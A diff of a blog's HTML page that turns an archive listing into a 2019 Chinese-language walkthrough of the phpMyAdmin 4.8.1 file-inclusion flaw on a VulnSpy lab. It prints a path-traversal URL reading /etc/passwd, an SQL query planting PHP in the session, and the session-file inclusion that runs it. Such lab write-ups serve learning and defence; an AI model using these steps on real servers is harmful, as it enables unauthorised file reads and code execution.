@@ -13,6 +13,12 @@
     
 
     
+        <meta name="description" content="参考文档：【首发】phpmyadmin4.8.1后台getshell
+环境：使用VulnSpy的在线phpMyAdmin环境来演示该漏洞的利用，地址：http://www.vulnspy.com/phpmyadmin-4.8.1/
+漏洞形成原因：/index.php55-63行
+
+这些判断使该版本存">
+    
 
     <!--Author-->
     
@@ -21,10 +27,16 @@
 
     <!--Open Graph Title-->
     
-        <meta property="og:title" content="Zovida">
+        <meta property="og:title" content="phpMyAdmin4.8.1漏洞测试">
     
 
     <!--Open Graph Description-->
+    
+        <meta property="og:description" content="参考文档：【首发】phpmyadmin4.8.1后台getshell
+环境：使用VulnSpy的在线phpMyAdmin环境来演示该漏洞的利用，地址：http://www.vulnspy.com/phpmyadmin-4.8.1/
+漏洞形成原因：/index.php55-63行
+
+这些判断使该版本存">
     
 
     <!--Open Graph Site Name-->
@@ -32,7 +44,7 @@
 
     <!--Type page-->
     
-        <meta property="og:type" content="website">
+        <meta property="og:type" content="article">
     
 
     <!--Page Cover-->
@@ -51,7 +63,7 @@
 
     <!-- Title -->
     
-    <title>Archives: 2019 - Zovida</title>
+    <title>phpMyAdmin4.8.1漏洞测试 - Zovida</title>
 
     <!-- Bootstrap Core CSS -->
     <link href="//maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet">
@@ -153,114 +165,77 @@
 </nav>
 
     <!-- Main Content -->
-    
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
 
-<!-- Page Header -->
-<!-- Set your background image for this header in the theme's configuration: index_cover -->
 <header class="intro-header" style="background-image: url('https://b2.bmp.ovh/imgs/2019/07/15d0796a4a8b1ce3.png')">
     <div class="container">
         <div class="row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <div class="site-heading">
-                    <h1>2019</h1>
+                <div class="post-heading">
+                    <h1>phpMyAdmin4.8.1漏洞测试</h1>
+                    
+                    <span class="meta">
+                        <!-- Date and Author -->
+                        
+                        
+                            2019-08-06
+                        
+                    </span>
                 </div>
             </div>
         </div>
     </div>
 </header>
 
-<!-- Main Content -->
-<div class="container">
-    <div class="row">
-        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+            <!-- Tags and categories -->
+           
+
+            <!-- Gallery -->
             
-                <div class="post-preview">
-    <a href="/2019/08/06/phpMyAdmin4.8漏洞/">
-        <h1 class="post-title archive">
-            phpMyAdmin4.8.1漏洞测试
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-06
-    </p>
-</div>
+
+            <!-- Post Main Content -->
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <p>参考文档：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247485036&idx=1&sn=8e9647906c5d94f72564dec5bc51a2ab&chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&mpshare=1&scene=1&srcid=0621gAv1FMtrgoahD01psMZr&pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">【首发】phpmyadmin4.8.1后台getshell</a></p>
+<h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><p>使用VulnSpy的在线phpMyAdmin环境来演示该漏洞的利用，地址：<a href="http://www.vulnspy.com/phpmyadmin-4.8.1/" target="_blank" rel="noopener">http://www.vulnspy.com/phpmyadmin-4.8.1/</a></p>
+<h4 id="漏洞形成原因："><a href="#漏洞形成原因：" class="headerlink" title="漏洞形成原因："></a>漏洞形成原因：</h4><p>/index.php<br>55-63行</p>
+<p><img src="https://b2.bmp.ovh/imgs/2019/08/a1da135a44c9c652.png" alt></p>
+<p>这些判断使该版本存在可被绕过的漏洞。</p>
+<p>1、进入在线漏洞测试环境，点击Start to Hack，跳转到漏洞测试界面，再点击Target Address进入测试。</p>
+<p><img src="http://www.vulnspy.com/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_1.png" alt></p>
+<p><img src="http://www.vulnspy.com/images/phpMyAdmin-4-8-x-LFI-Exploit/exp_3.png" alt></p>
+<p>2、使用账号root，密码toor进入phpMyAdmin</p>
+<p><img src="https://www.vulnspy.com/images/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_1.png." alt></p>
+<p>3、访问<a href="http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd" target="_blank" rel="noopener">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</a> ，发现passwd文件可以被读取，说明文件包含漏洞出现</p>
+<p>4、返回首页，点击SQL，执行SQL查询指令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select <span class="string">'&lt;?php phpinfo();exit;?&gt;'</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://www.vulnspy.com/images/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_2.png" alt></p>
+<p>5、在浏览器内按下F12，进入Application的Cookies界面，查询session ID</p>
+<p><img src="https://www.vulnspy.com/images/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_3.png" alt></p>
+<p>6、然后访问<a href="http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k" target="_blank" rel="noopener">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</a> ，包含session文件即可利用该漏洞</p>
+<p><img src="https://www.vulnspy.com/images/phpMyAdmin-4-8-x-Authorited-CLI-to-RCE/exp_4.png" alt></p>
+
+
+                
+            </div>
+
+            <!-- Comments -->
             
-                <div class="post-preview">
-    <a href="/2019/08/06/dvwa的搭建/">
-        <h1 class="post-title archive">
-            dvwa漏洞测试环境的搭建
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-06
-    </p>
-</div>
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                    
+
+
+                </div>
             
-                <div class="post-preview">
-    <a href="/2019/08/06/mariadb的搭建/">
-        <h1 class="post-title archive">
-            mariadb的搭建
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-06
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/05/apache服务器的搭建/">
-        <h1 class="post-title archive">
-            apache服务器的搭建
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-05
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/08/04/tomcat服务器的搭建/">
-        <h1 class="post-title archive">
-            tomcat服务器的搭建
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-08-04
-    </p>
-</div>
-            
-                <div class="post-preview">
-    <a href="/2019/07/30/Git服务器的搭建/">
-        <h1 class="post-title archive">
-            git服务器的搭建
-        </h1>
-    </a>
-    <p class="post-meta archive">
-        <!-- Date and Author -->
-        
-        2019-07-30
-    </p>
-</div>
-            
-            <div class="archive-before-pagination"></div>
-            <ul class="pager">
-    
-    
-</ul>
         </div>
     </div>
-</div>
-
+</article>
 
     <!-- Footer -->
     <hr />
